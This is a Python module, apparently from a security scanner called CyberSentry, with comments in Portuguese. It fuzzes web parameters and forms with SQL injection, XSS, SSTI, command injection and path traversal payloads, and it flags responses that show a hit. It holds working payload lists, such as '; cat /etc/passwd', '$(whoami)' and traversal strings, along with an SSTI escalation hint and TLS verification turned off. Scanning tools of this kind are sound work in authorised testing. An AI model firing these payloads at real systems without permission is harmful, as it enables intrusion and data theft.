"""CyberSentry Fuzzer — Sub-módulo de testes de injeção ativos.

Testa SQL Injection (error-based + time-based), XSS (reflected + DOM),
Server-Side Template Injection (SSTI), Command Injection e Path Traversal
em todos os pontos de entrada descobertos pelo crawler.

⚠️  Use APENAS em alvos dos quais você tenha autorização explícita.
    Estes testes enviam payloads reais que podem alterar comportamento do alvo.
"""

from __future__ import annotations

import asyncio
import logging
import re
import time
from typing import Any
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

SQLI_PAYLOADS: list[dict[str, str]] = [
    {"payload": "' OR '1'='1", "type": "error-based"},
    {"payload": "' OR '1'='1'--", "type": "error-based"},
    {"payload": '" OR "1"="1"--', "type": "error-based"},
    {"payload": "1' AND 1=1--", "type": "boolean-based"},
    {"payload": "1' AND 1=2--", "type": "boolean-based"},
    {"payload": "' UNION SELECT NULL--", "type": "union-based"},
    {"payload": "' UNION SELECT NULL,NULL--", "type": "union-based"},
    {"payload": "1; WAITFOR DELAY '0:0:3'--", "type": "time-based"},
    {"payload": "1' AND SLEEP(3)--", "type": "time-based"},
    {"payload": "1' AND pg_sleep(3)--", "type": "time-based"},
    {"payload": "1' OR BENCHMARK(5000000,SHA1('test'))--", "type": "time-based"},
    {"payload": "admin'--", "type": "auth-bypass"},
    {"payload": "' OR 1=1 LIMIT 1--", "type": "auth-bypass"},
]

SQLI_ERROR_PATTERNS: list[str] = [
    r"mysql_fetch", r"mysql_num_rows", r"mysql_query",
    r"You have an error in your SQL syntax",
    r"Warning.*mysql_", r"MySQLSyntaxErrorException",
    r"Unclosed quotation mark",
    r"Microsoft OLE DB Provider",
    r"ODBC SQL Server Driver",
    r"SQLServer JDBC Driver", r"com\.microsoft\.sqlserver",
    r"ORA-\d{5}", r"Oracle.*Driver", r"oracle\.jdbc",
    r"PostgreSQL.*ERROR", r"pg_query", r"pg_exec",
    r"SQLite3?::SQLException", r"SQLITE_ERROR",
    r"unterminated string", r"syntax error",
    r"SQL syntax.*MySQL", r"valid MySQL result",
    r"javax\.persistence", r"hibernate",
    r"org\.hibernate\.QueryException",
    r"PSQLException", r"relation.*does not exist",
    r"OperationalError",
    r"ProgrammingError",
    r"near \".*\": syntax error",
]

XSS_PAYLOADS: list[dict[str, str]] = [
    {"payload": "<script>alert('XSS')</script>", "type": "basic"},
    {"payload": "<img src=x onerror=alert('XSS')>", "type": "img-onerror"},
    {"payload": "<svg onload=alert('XSS')>", "type": "svg-onload"},
    {"payload": "'\"><script>alert('XSS')</script>", "type": "breakout"},
    {"payload": "<body onload=alert('XSS')>", "type": "body-onload"},
    {"payload": "javascript:alert('XSS')", "type": "js-protocol"},
    {"payload": "<input onfocus=alert('XSS') autofocus>", "type": "autofocus"},
    {"payload": "<details open ontoggle=alert('XSS')>", "type": "details"},
    {"payload": "'-alert('XSS')-'", "type": "js-context"},
    {"payload": "\";alert('XSS');//", "type": "js-string-break"},
    # Polyglots compactos
    {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//",
     "type": "polyglot"},
]

SSTI_PAYLOADS: list[dict[str, Any]] = [
    {"payload": "{{7*7}}", "expected": "49", "engine": "Jinja2/Twig"},
    {"payload": "${7*7}", "expected": "49", "engine": "FreeMarker/Mako"},
    {"payload": "<%= 7*7 %>", "expected": "49", "engine": "ERB/EJS"},
    {"payload": "#{7*7}", "expected": "49", "engine": "Ruby/Slim"},
    {"payload": "{{7*'7'}}", "expected": "7777777", "engine": "Jinja2"},
    {"payload": "${7*7}", "expected": "49", "engine": "Spring EL"},
    {"payload": "@(7*7)", "expected": "49", "engine": "Razor"},
    {"payload": "{{config}}", "expected": "Config", "engine": "Jinja2-config-leak"},
    {"payload": "{{self.__class__}}", "expected": "class", "engine": "Jinja2-class-leak"},
]

CMDI_PAYLOADS: list[dict[str, str]] = [
    {"payload": "; whoami", "marker": "root|www-data|nginx|apache|admin|Administrator"},
    {"payload": "| whoami", "marker": "root|www-data|nginx|apache|admin|Administrator"},
    {"payload": "& whoami", "marker": "root|www-data|nginx|apache|admin|Administrator"},
    {"payload": "`whoami`", "marker": "root|www-data|nginx|apache|admin|Administrator"},
    {"payload": "$(whoami)", "marker": "root|www-data|nginx|apache|admin|Administrator"},
    {"payload": "; id", "marker": r"uid=\d+"},
    {"payload": "| id", "marker": r"uid=\d+"},
    {"payload": "; cat /etc/passwd", "marker": r"root:.*:0:0"},
    {"payload": "| type C:\\Windows\\win.ini", "marker": r"\[fonts\]|\[extensions\]"},
    {"payload": "; echo CORTANA_SENTRY_MARKER", "marker": "CORTANA_SENTRY_MARKER"},
    {"payload": "| echo CORTANA_SENTRY_MARKER", "marker": "CORTANA_SENTRY_MARKER"},
]

PATH_TRAVERSAL_PAYLOADS: list[dict[str, str]] = [
    {"payload": "../../etc/passwd", "marker": r"root:.*:0:0"},
    {"payload": "../../../etc/passwd", "marker": r"root:.*:0:0"},
    {"payload": "....//....//etc/passwd", "marker": r"root:.*:0:0"},
    {"payload": "..%2f..%2f..%2fetc%2fpasswd", "marker": r"root:.*:0:0"},
    {"payload": "..\\..\\..\\windows\\win.ini", "marker": r"\[fonts\]|\[extensions\]"},
    {"payload": "..%5c..%5c..%5cwindows%5cwin.ini", "marker": r"\[fonts\]|\[extensions\]"},
    {"payload": "/etc/passwd", "marker": r"root:.*:0:0"},
    {"payload": "file:///etc/passwd", "marker": r"root:.*:0:0"},
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _build_session() -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = "CortanaSentry/2.0"
    s.verify = False
    s.timeout = 10
    return s


def _extract_params_from_url(url: str) -> dict[str, str]:
    """Extrai parâmetros de query string da URL."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    return {k: v[0] for k, v in qs.items()}


def _inject_param(url: str, param: str, payload: str) -> str:
    """Substitui valor de um parâmetro na URL pelo payload."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    qs[param] = [payload]
    new_query = urlencode({k: v[0] for k, v in qs.items()})
    return parsed._replace(query=new_query).geturl()


# ---------------------------------------------------------------------------
# SQL Injection Tester
# ---------------------------------------------------------------------------

async def test_sqli(
    url: str,
    params: dict[str, str] | None = None,
    forms: list[dict[str, Any]] | None = None,
) -> list[dict[str, Any]]:
    """Testa SQL Injection em parâmetros GET e formulários POST."""
    findings: list[dict[str, Any]] = []
    session = _build_session()
    loop = asyncio.get_event_loop()

    # GET params
    target_params = params or _extract_params_from_url(url)
    for param_name, original_value in target_params.items():
        for payload_info in SQLI_PAYLOADS:
            payload = payload_info["payload"]
            ptype = payload_info["type"]

            if ptype == "time-based":
                injected_url = _inject_param(url, param_name, payload)
                try:
                    start = time.time()
                    resp = await loop.run_in_executor(
                        None, lambda u=injected_url: session.get(u, timeout=15)
                    )
                    elapsed = time.time() - start
                    if elapsed >= 2.5:
                        findings.append({
                            "type": "SQLi",
                            "subtype": "time-based blind",
                            "severity": "CRITICAL",
                            "param": param_name,
                            "method": "GET",
                            "payload": payload,
                            "evidence": f"Tempo de resposta: {elapsed:.2f}s (esperado >2.5s)",
                            "url": injected_url,
                            "attack_scenario": (
                                "Um atacante pode extrair dados do banco de dados inteiro "
                                "caractere por caractere usando técnicas de blind SQLi com "
                                "SLEEP/WAITFOR, inclusive senhas, emails e dados financeiros "
                                "de todos os clientes sem deixar rastro nos logs da aplicação."
                            ),
                        })
                        break  # um basta pra esse param
                except Exception:
                    continue
            else:
                injected_url = _inject_param(url, param_name, payload)
                try:
                    resp = await loop.run_in_executor(
                        None, lambda u=injected_url: session.get(u, timeout=10)
                    )
                    body = resp.text
                    for pattern in SQLI_ERROR_PATTERNS:
                        if re.search(pattern, body, re.IGNORECASE):
                            findings.append({
                                "type": "SQLi",
                                "subtype": f"error-based ({ptype})",
                                "severity": "CRITICAL",
                                "param": param_name,
                                "method": "GET",
                                "payload": payload,
                                "evidence": f"Padrão de erro SQL detectado: `{pattern}`",
                                "url": injected_url,
                                "attack_scenario": (
                                    "O servidor expõe erros de SQL diretamente na resposta HTTP. "
                                    "Um atacante pode usar UNION-based ou error-based SQLi para "
                                    "extrair tabelas inteiras do banco de dados corporativo, "
                                    "incluindo credenciais de administradores e dados financeiros."
                                ),
                            })
                            break
                    else:
                        continue
                    break  # encontrou neste param, pula pro próximo
                except Exception:
                    continue

    # POST forms
    if forms:
        for form in forms:
            form_action = form.get("action", "")
            form_url = urljoin(url, form_action) if form_action else url
            form_method = form.get("method", "GET").upper()
            fields = form.get("fields", [])

            if form_method != "POST":
                continue

            for fld in fields:
                fname = fld.get("name", "")
                if not fname or fld.get("type") in ("hidden", "submit", "button", "file"):
                    continue

                for payload_info in SQLI_PAYLOADS[:6]:  # testar os primeiros payloads
                    payload = payload_info["payload"]
                    post_data = {f.get("name", ""): f.get("value", "test") for f in fields}
                    post_data[fname] = payload

                    try:
                        resp = await loop.run_in_executor(
                            None, lambda: session.post(form_url, data=post_data, timeout=10)
                        )
                        body = resp.text
                        for pattern in SQLI_ERROR_PATTERNS:
                            if re.search(pattern, body, re.IGNORECASE):
                                findings.append({
                                    "type": "SQLi",
                                    "subtype": "error-based (POST form)",
                                    "severity": "CRITICAL",
                                    "param": fname,
                                    "method": "POST",
                                    "payload": payload,
                                    "evidence": f"Padrão de erro SQL em `{form_url}`: `{pattern}`",
                                    "url": form_url,
                                    "attack_scenario": (
                                        "Formulários POST vulneráveis a SQL Injection permitem "
                                        "bypass de autenticação (login admin sem senha), "
                                        "extração massiva de dados e até execução de comandos "
                                        "no sistema operacional do servidor via xp_cmdshell ou "
                                        "INTO OUTFILE."
                                    ),
                                })
                                break
                    except Exception:
                        continue

    session.close()
    return findings


# ---------------------------------------------------------------------------
# XSS Tester
# ---------------------------------------------------------------------------

async def test_xss(
    url: str,
    params: dict[str, str] | None = None,
    forms: list[dict[str, Any]] | None = None,
) -> list[dict[str, Any]]:
    """Testa XSS Reflected em parâmetros GET e formulários POST."""
    findings: list[dict[str, Any]] = []
    session = _build_session()
    loop = asyncio.get_event_loop()

    target_params = params or _extract_params_from_url(url)
    for param_name in target_params:
        for payload_info in XSS_PAYLOADS:
            payload = payload_info["payload"]
            injected_url = _inject_param(url, param_name, payload)
            try:
                resp = await loop.run_in_executor(
                    None, lambda u=injected_url: session.get(u, timeout=10)
                )
                if payload in resp.text:
                    idx = resp.text.find(payload)
                    snippet = resp.text[max(0, idx - 60):idx + len(payload) + 60].strip()
                    findings.append({
                        "type": "XSS",
                        "subtype": f"reflected ({payload_info['type']})",
                        "severity": "HIGH",
                        "param": param_name,
                        "method": "GET",
                        "payload": payload,
                        "evidence": (
                            f"Endpoint: `{injected_url}`\n"
                            f"Parâmetro: `{param_name}`\n"
                            f"Payload enviado: `{payload}`\n"
                            f"Trecho da resposta HTML onde o payload foi refletido:\n"
                            f"```\n...{snippet}...\n```"
                        ),
                        "url": injected_url,
                        "attack_scenario": (
                            "Um atacante pode criar um link malicioso com o payload XSS embutido "
                            "e enviar por email/WhatsApp para funcionários ou clientes da empresa. "
                            "Ao clicar, o script executa no navegador da vítima, roubando cookies "
                            "de sessão (Account Takeover), redirecionando para páginas falsas de "
                            "login ou instalando keyloggers invisíveis."
                        ),
                    })
                    break
            except Exception:
                continue

    # POST forms
    if forms:
        for form in forms:
            form_action = form.get("action", "")
            form_url = urljoin(url, form_action) if form_action else url
            fields = form.get("fields", [])

            for fld in fields:
                fname = fld.get("name", "")
                if not fname or fld.get("type") in ("hidden", "submit", "button", "file"):
                    continue

                for payload_info in XSS_PAYLOADS[:5]:
                    payload = payload_info["payload"]
                    post_data = {f.get("name", ""): f.get("value", "test") for f in fields}
                    post_data[fname] = payload

                    try:
                        resp = await loop.run_in_executor(
                            None, lambda: session.post(form_url, data=post_data, timeout=10)
                        )
                        if payload in resp.text:
                            idx = resp.text.find(payload)
                            snippet = resp.text[max(0, idx - 60):idx + len(payload) + 60].strip()
                            findings.append({
                                "type": "XSS",
                                "subtype": f"reflected POST ({payload_info['type']})",
                                "severity": "HIGH",
                                "param": fname,
                                "method": "POST",
                                "payload": payload,
                                "evidence": (
                                    f"Endpoint (POST): `{form_url}`\n"
                                    f"Parâmetro do formulário: `{fname}`\n"
                                    f"Payload enviado: `{payload}`\n"
                                    f"Trecho da resposta HTML onde o payload foi refletido:\n"
                                    f"```\n...{snippet}...\n```"
                                ),
                                "url": form_url,
                                "attack_scenario": (
                                    "Formulários que refletem input do usuário sem sanitização "
                                    "são alvos de Stored XSS quando persistidos no banco. "
                                    "Atacantes injetam scripts permanentes que afetam TODOS "
                                    "os usuários que acessarem a página."
                                ),
                            })
                            break
                    except Exception:
                        continue

    session.close()
    return findings


# ---------------------------------------------------------------------------
# SSTI Tester
# ---------------------------------------------------------------------------

async def test_ssti(url, params=None):
    findings = []
    session = _build_session()
    loop = asyncio.get_event_loop()
    target_params = params or _extract_params_from_url(url)

    for param_name in target_params:
        # ── ETAPA 1: sinal matemático ──────────────────────────────
        # Envia {{7*7}}, verifica se "49" aparece de forma isolada
        # (não como parte de "149", "490", "2049" etc.)
        stage1_hits = []
        for p in [{"payload": "{{7*7}}", "expected": r"\b49\b", "engine": "Jinja2/Twig"},
                  {"payload": "${7*7}",  "expected": r"\b49\b", "engine": "FreeMarker/Mako"},
                  {"payload": "<%= 7*7 %>", "expected": r"\b49\b", "engine": "ERB/EJS"}]:
            injected = _inject_param(url, param_name, p["payload"])
            try:
                resp = await loop.run_in_executor(None, lambda u=injected: session.get(u, timeout=10))
                # Verifica \b49\b (word boundary) E que o payload não está refletido raw
                if re.search(p["expected"], resp.text) and p["payload"] not in resp.text:
                    # Captura contexto ao redor do "49" para evidência
                    match = re.search(r'.{0,30}\b49\b.{0,30}', resp.text)
                    context = match.group(0).strip() if match else "49"
                    stage1_hits.append({**p, "context": context, "url": injected})
            except Exception:
                continue

        if not stage1_hits:
            continue  # Sem sinal matemático, vai pro próximo parâmetro

        # ── ETAPA 1.5: controle de string ──────────────────────────
        # Envia {{"abc"}} — se retornar "abc" (sem as chaves), o template
        # está interpretando strings, não apenas refletindo input.
        # Isso distingue template execution de simples reflection.
        string_control_ok = False
        for hit in stage1_hits:
            sc_payload = '{{"abc"}}'
            sc_url = _inject_param(url, param_name, sc_payload)
            try:
                resp_sc = await loop.run_in_executor(None, lambda u=sc_url: session.get(u, timeout=10))
                # "abc" aparece mas o payload raw não foi refletido inteiro
                if "abc" in resp_sc.text and sc_payload not in resp_sc.text:
                    string_control_ok = True
                    break
            except Exception:
                continue

        # ── ETAPA 1.6: syntax break ────────────────────────────────
        # Envia {{7*}} — sintaxe inválida para a maioria das engines.
        # Se o servidor retornar um erro de template → engine está ativa e avaliando.
        # Padrões de erro de template engines conhecidas:
        TEMPLATE_ERROR_PATTERNS = [
            r"TemplateSyntaxError", r"TemplateError", r"jinja2",
            r"UndefinedError", r"syntax error in template",
            r"unexpected end of template", r"unexpected '\}'",
            r"TemplateSyntaxException", r"freemarker\.template",
            r"org\.thymeleaf", r"Twig_Error", r"SyntaxError.*template",
            r"template rendering", r"render error",
        ]
        syntax_error_ok = False
        for hit in stage1_hits:
            sb_payload = "{{7*}}"
            sb_url = _inject_param(url, param_name, sb_payload)
            try:
                resp_sb = await loop.run_in_executor(None, lambda u=sb_url: session.get(u, timeout=10))
                if any(re.search(pat, resp_sb.text, re.IGNORECASE) for pat in TEMPLATE_ERROR_PATTERNS):
                    syntax_error_ok = True
                    break
            except Exception:
                continue

        # ── ETAPA 2: diferenciação de engine ───────────────────────
        # {{7*'7'}} → Jinja2 retorna '7777777', Twig retorna 49
        confirmed_engine = None
        for hit in stage1_hits:
            diff_payload = "{{7*'7'}}"
            diff_url = _inject_param(url, param_name, diff_payload)
            try:
                resp2 = await loop.run_in_executor(None, lambda u=diff_url: session.get(u, timeout=10))
                if "7777777" in resp2.text and diff_payload not in resp2.text:
                    confirmed_engine = "Jinja2 (confirmado)"
                    break
                elif re.search(r'\b49\b', resp2.text) and diff_payload not in resp2.text:
                    confirmed_engine = f"{hit['engine']} (provável)"
            except Exception:
                continue

        # Calcula confiança baseada em quantas etapas passaram
        confidence_score = sum([
            bool(stage1_hits),      # sinal matemático
            string_control_ok,      # controle de string
            syntax_error_ok,        # syntax break
            bool(confirmed_engine), # engine diferenciada
        ])

        if confidence_score <= 1:
            # Apenas sinal matemático → INDÍCIO, não reportar como finding real
            # (pode ser coincidência ou reflexão simples)
            continue

        if not confirmed_engine:
            # Stage 1 + pelo menos 1 validação adicional → PROVÁVEL
            confidence_label = "PROVÁVEL" if (string_control_ok or syntax_error_ok) else "INDÍCIO"
            evidence_lines = [
                f"Etapa 1 — Sinal matemático: payload `{stage1_hits[0]['payload']}` → contexto: `...{stage1_hits[0]['context']}...`",
                f"Etapa 1.5 — Controle de string ({{'\"abc\"'}}): {'✅ retornou \"abc\" sem refletir o payload raw' if string_control_ok else '❌ inconclusivo'}",
                f"Etapa 1.6 — Syntax break ({{'7*'}}): {'✅ erro de template detectado na resposta' if syntax_error_ok else '❌ sem erro de template'}",
                f"Etapa 2 — Diferenciação de engine: ❌ inconclusiva",
                f"Confiança: {confidence_label}",
            ]
            findings.append({
                "type": "SSTI",
                "subtype": f"provável — engine não confirmada ({confidence_label})",
                "severity": "MEDIUM",
                "param": param_name,
                "payload": stage1_hits[0]["payload"],
                "evidence": "\n".join(evidence_lines),
                "url": stage1_hits[0]["url"],
                "attack_scenario": (
                    f"SSTI {confidence_label}: sinal matemático + "
                    f"{'controle de string ' if string_control_ok else ''}"
                    f"{'syntax break ' if syntax_error_ok else ''}detectados. "
                    "Requer validação manual com payloads de context access para confirmar impacto."
                )
            })
            continue

        # ── ETAPA 3: acesso a contexto / extração ─────────────────
        # Só chega aqui se engine confirmada (Stage 2 passou).
        # Testa self, config, request — se retornar dados internos → CRITICAL real.
        rce_confirmed = False
        rce_evidence = ""
        context_payload_used = ""
        extraction_payloads = [
            {"payload": "{{config}}", "marker": r"Config|SECRET_KEY|DATABASE|DEBUG"},
            {"payload": "{{self}}", "marker": r"TemplateReference|namespace|Jinja2"},
            {"payload": "{{request}}", "marker": r"Request|environ|wsgi|HTTP_HOST"},
            {"payload": "{{''.__class__.__mro__}}", "marker": r"object|type|class"},
            {"payload": "{{request.environ}}", "marker": r"wsgi|SERVER_NAME|HTTP_HOST"},
        ]
        for ep in extraction_payloads:
            ep_url = _inject_param(url, param_name, ep["payload"])
            try:
                resp3 = await loop.run_in_executor(None, lambda u=ep_url: session.get(u, timeout=10))
                if re.search(ep["marker"], resp3.text, re.IGNORECASE) and ep["payload"] not in resp3.text:
                    match = re.search(r'.{0,80}(' + ep["marker"] + r').{0,80}', resp3.text, re.IGNORECASE)
                    rce_evidence = match.group(0).strip() if match else "objeto interno retornado"
                    context_payload_used = ep["payload"]
                    rce_confirmed = True
                    break
            except Exception:
                continue

        severity = "CRITICAL" if rce_confirmed else "HIGH"
        evidence_lines = [
            f"Etapa 1 — Sinal matemático: payload `{stage1_hits[0]['payload']}` → `...{stage1_hits[0]['context']}...`",
            f"Etapa 1.5 — Controle de string: {'✅ `{{\"abc\"}}` retornou \"abc\" — execução de string confirmada' if string_control_ok else '❌ inconclusivo'}",
            f"Etapa 1.6 — Syntax break: {'✅ erro de template detectado — engine avaliando expressões' if syntax_error_ok else '❌ sem erro de template'}",
            f"Etapa 2 — Engine: {confirmed_engine}",
        ]
        if rce_confirmed:
            evidence_lines.append(
                f"Etapa 3 — Acesso a contexto: payload `{context_payload_used}` "
                f"retornou dados internos: `...{rce_evidence}...`"
            )
            evidence_lines.append("Confiança: CONFIRMADO — execução server-side com acesso a objetos internos")
        else:
            evidence_lines.append("Etapa 3 — Acesso a contexto: ❌ payloads de extração inconclusivos")
            evidence_lines.append("Confiança: PROVÁVEL — execução confirmada, impacto ainda não extraído")

        findings.append({
            "type": "SSTI",
            "subtype": f"confirmed ({confirmed_engine})" + (" + context access" if rce_confirmed else ""),
            "severity": severity,
            "param": param_name,
            "payload": stage1_hits[0]["payload"],
            "evidence": "\n".join(evidence_lines),
            "url": stage1_hits[0]["url"],
            "attack_scenario": (
                f"SSTI {'CRÍTICA' if rce_confirmed else 'provável'} em {confirmed_engine}. "
                + (f"Acesso a objeto interno confirmado via `{context_payload_used}`. "
                   "Escalável para RCE completo via `{{''.__class__.__mro__[1].__subclasses__()}}` "
                   "ou leitura de SECRET_KEY para forjar tokens de sessão."
                   if rce_confirmed else
                   "Engine confirmada mas extração de contexto inconclusiva. "
                   "Testar manualmente: `{{config}}`, `{{self}}`, `{{request.environ}}`.")
            )
        })

    session.close()
    return findings

# ---------------------------------------------------------------------------
# Command Injection Tester
# ---------------------------------------------------------------------------

async def test_cmdi(
    url: str,
    params: dict[str, str] | None = None,
) -> list[dict[str, Any]]:
    """Testa Command Injection em parâmetros GET."""
    findings: list[dict[str, Any]] = []
    session = _build_session()
    loop = asyncio.get_event_loop()

    target_params = params or _extract_params_from_url(url)
    for param_name in target_params:
        for payload_info in CMDI_PAYLOADS:
            payload = payload_info["payload"]
            marker = payload_info["marker"]
            injected_url = _inject_param(url, param_name, payload)
            try:
                resp = await loop.run_in_executor(
                    None, lambda u=injected_url: session.get(u, timeout=10)
                )
                if re.search(marker, resp.text):
                    match = re.search(r'.{0,40}(' + marker + r').{0,40}', resp.text)
                    captured = match.group(0).strip() if match else "marker encontrado"
                    findings.append({
                        "type": "Command Injection",
                        "subtype": "OS command execution",
                        "severity": "CRITICAL",
                        "param": param_name,
                        "method": "GET",
                        "payload": payload,
                        "evidence": (
                            f"Endpoint: `{injected_url}`\n"
                            f"Parâmetro: `{param_name}`\n"
                            f"Payload enviado: `{payload}`\n"
                            f"Output do SO capturado na resposta: `...{captured}...`"
                        ),
                        "url": injected_url,
                        "attack_scenario": (
                            "O atacante tem execução de comandos direta no sistema "
                            "operacional do servidor. Isso permite: instalar backdoors, "
                            "exfiltrar TODA a base de dados, pivotar para a rede interna "
                            "da empresa, instalar ransomware e ter controle total "
                            "da infraestrutura."
                        ),
                    })
                    break
            except Exception:
                continue

    session.close()
    return findings


# ---------------------------------------------------------------------------
# Path Traversal / LFI
# ---------------------------------------------------------------------------

async def test_path_traversal(
    url: str,
    params: dict[str, str] | None = None,
) -> list[dict[str, Any]]:
    """Testa LFI / Path Traversal em parâmetros GET."""
    findings: list[dict[str, Any]] = []
    session = _build_session()
    loop = asyncio.get_event_loop()

    target_params = params or _extract_params_from_url(url)
    # Focar em parâmetros que sugerem file inclusion
    file_param_hints = ("file", "path", "page", "doc", "document", "template",
                        "include", "load", "read", "view", "lang", "dir",
                        "folder", "module", "content", "url", "src")

    for param_name in target_params:
        # Testar todos, mas priorizar nomes sugestivos
        for payload_info in PATH_TRAVERSAL_PAYLOADS:
            payload = payload_info["payload"]
            marker = payload_info["marker"]
            injected_url = _inject_param(url, param_name, payload)
            try:
                resp = await loop.run_in_executor(
                    None, lambda u=injected_url: session.get(u, timeout=10)
                )
                if re.search(marker, resp.text):
                    file_match = re.search(r'.{0,20}(' + marker + r').{0,100}', resp.text)
                    file_snippet = file_match.group(0).strip() if file_match else "conteúdo detectado"
                    findings.append({
                        "type": "Path Traversal / LFI",
                        "subtype": "local file read",
                        "severity": "CRITICAL",
                        "param": param_name,
                        "method": "GET",
                        "payload": payload,
                        "evidence": (
                            f"Endpoint: `{injected_url}`\n"
                            f"Parâmetro: `{param_name}`\n"
                            f"Payload enviado: `{payload}`\n"
                            f"Conteúdo do arquivo lido na resposta:\n"
                            f"```\n...{file_snippet}...\n```"
                        ),
                        "url": injected_url,
                        "attack_scenario": (
                            "O atacante pode ler qualquer arquivo do servidor: "
                            "/etc/passwd, /etc/shadow, arquivos de configuração com "
                            "senhas de banco de dados, chaves SSH privadas e código-fonte "
                            "da aplicação. Com LFI e log poisoning, pode escalar para "
                            "Remote Code Execution (RCE)."
                        ),
                    })
                    break
            except Exception:
                continue

    session.close()
    return findings


# ---------------------------------------------------------------------------
# Orquestrador — Fuzz All Inputs
# ---------------------------------------------------------------------------

async def fuzz_all_inputs(
    url: str,
    params: dict[str, str] | None = None,
    forms: list[dict[str, Any]] | None = None,
    callback=None,
) -> list[dict[str, Any]]:
    """Executa TODOS os testes de injeção em todos os pontos de entrada encontrados."""
    all_findings: list[dict[str, Any]] = []

    if callback:
        await callback("💉 Fase Fuzzing — Testando SQL Injection...")
    sqli = await test_sqli(url, params, forms)
    all_findings.extend(sqli)
    if sqli and callback:
        await callback(f"🔴 {len(sqli)} possíveis SQLi encontradas!")

    if callback:
        await callback("💉 Fase Fuzzing — Testando XSS Reflected...")
    xss = await test_xss(url, params, forms)
    all_findings.extend(xss)
    if xss and callback:
        await callback(f"🟠 {len(xss)} possíveis XSS encontrados!")

    if callback:
        await callback("💉 Fase Fuzzing — Testando SSTI...")
    ssti = await test_ssti(url, params)
    all_findings.extend(ssti)
    if ssti and callback:
        await callback(f"🔴 {len(ssti)} possíveis SSTI encontradas!")

    if callback:
        await callback("💉 Fase Fuzzing — Testando Command Injection...")
    cmdi = await test_cmdi(url, params)
    all_findings.extend(cmdi)
    if cmdi and callback:
        await callback(f"🔴 {len(cmdi)} possíveis Command Injections!")

    if callback:
        await callback("💉 Fase Fuzzing — Testando Path Traversal / LFI...")
    lfi = await test_path_traversal(url, params)
    all_findings.extend(lfi)
    if lfi and callback:
        await callback(f"🔴 {len(lfi)} possíveis LFI/Path Traversals!")

    return all_findings
